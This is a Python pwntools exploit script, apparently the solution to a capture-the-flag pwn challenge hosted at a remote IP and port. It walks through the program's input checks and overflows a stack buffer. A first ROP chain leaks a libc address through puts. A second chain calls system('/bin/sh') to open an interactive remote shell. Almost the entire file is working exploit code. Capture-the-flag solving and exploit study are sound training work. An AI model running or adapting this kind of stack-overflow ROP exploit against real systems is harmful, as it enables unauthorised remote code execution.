#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# --- CONFIGURATION ---
# Set the context for the binary architecture
context.update(arch='amd64', os='linux')

# Connection details from the challenge description
HOST = "103.160.212.3"
PORT = 1470

# --- ADDRESSES & OFFSETS ---
# These addresses are from the provided decompiled output and common gadget tools.
# As the problem setter, you should verify these against your final binary.

# ROP Gadgets
POP_RDI_RET = 0x000000000040141b # ROPgadget --binary chall | grep "pop rdi"

# PLT and GOT addresses for leaking libc
# Use `objdump -d -j .plt chall` and `objdump -R chall`
PUTS_PLT = 0x0000000000401060
READ_GOT = 0x0000000000404030

# Address of main to loop back for the second stage
MAIN_ADDR = 0x00000000004014ea

# Offset from the start of the buffer to the return address in function2's frame
# This needs to be found with GDB by analyzing the stack frame of function2.
# The buffer `numbers` is at rbp-0x60 and the return address is at rbp+0x8.
# Offset = 0x60 (buffer) + 0x8 (saved rbp) = 104 bytes.
OFFSET = 104

# --- LIBC OFFSETS ---
# You need to find the correct libc version used on the server.
# Then find the offsets of `read`, `system`, and the string "/bin/sh".
# Example: `readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' read@'`
#          `strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'`
# These are placeholders for a common libc version (e.g., Ubuntu 2.27)
LIBC_READ_OFFSET = 0x111160
LIBC_SYSTEM_OFFSET = 0x055410
LIBC_BINSH_OFFSET = 0x1b75aa

# --- EXPLOIT LOGIC ---

def solve_challenge():
    """
    Connects to the server, leaks a libc address, calculates system(),
    and pops a shell.
    """
    p = remote(HOST, PORT)

    # --- Stage 1: Leak Libc Address ---
    log.info("--- STAGE 1: Leaking Libc Address ---")

    # Bypass the first check by failing it, which leads to the second check.
    p.recvuntil(b"> ")
    p.sendline(b"1.0")

    # Pass the strncmp check to enter function2.
    # We send two identical non-zero numbers.
    p.recvuntil(b"Now, give me two special numbers!\n> ")
    p.sendline(b"1337 1337")

    # Fail the magic number check to get to the vulnerable read().
    p.recvuntil(b"What's the magic number?\n> ")
    p.sendline(b"123")

    # ROP chain to call puts(read@got) and then loop back to main.
    rop_leak = p64(POP_RDI_RET)
    rop_leak += p64(READ_GOT)   # Argument for puts: address of read in GOT
    rop_leak += p64(PUTS_PLT)   # Call puts@plt
    rop_leak += p64(MAIN_ADDR)  # Return to main for the second stage

    payload1 = b'A' * OFFSET + rop_leak
    
    log.info("Sending payload to leak libc...")
    p.recvuntil(b"what would you like to change it to\n> ")
    p.sendline(payload1)

    # Receive and parse the leaked address
    p.recvline() # Discard the "Haha just kidding..." line
    leaked_read_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
    log.success(f"Leaked read() address: {hex(leaked_read_addr)}")

    # Calculate libc base and system()/bin/sh addresses
    libc_base = leaked_read_addr - LIBC_READ_OFFSET
    system_addr = libc_base + LIBC_SYSTEM_OFFSET
    binsh_addr = libc_base + LIBC_BINSH_OFFSET
    log.success(f"Calculated libc base: {hex(libc_base)}")
    log.success(f"Calculated system() address: {hex(system_addr)}")
    log.success(f"Calculated '/bin/sh' address: {hex(binsh_addr)}")

    # --- Stage 2: Get a Shell ---
    log.info("--- STAGE 2: Getting a shell ---")

    # We are back in main(), so we repeat the steps to get to the vulnerability.
    p.recvuntil(b"> ")
    p.sendline(b"1.0")
    p.recvuntil(b"Now, give me two special numbers!\n> ")
    p.sendline(b"1337 1337")
    p.recvuntil(b"What's the magic number?\n> ")
    p.sendline(b"123")

    # ROP chain to call system("/bin/sh").
    # A `ret` gadget is needed for stack alignment on some systems.
    rop_shell = p64(POP_RDI_RET + 1) # ret gadget for alignment
    rop_shell += p64(POP_RDI_RET)
    rop_shell += p64(binsh_addr)    # Argument for system: pointer to "/bin/sh"
    rop_shell += p64(system_addr)   # Call system()

    payload2 = b'A' * OFFSET + rop_shell

    log.info("Sending payload to pop a shell...")
    p.recvuntil(b"what would you like to change it to\n> ")
    p.sendline(payload2)

    # --- Enjoy the shell ---
    log.success("Exploit sent! You should have a shell.")
    p.interactive()


if __name__ == "__main__":
    solve_challenge()
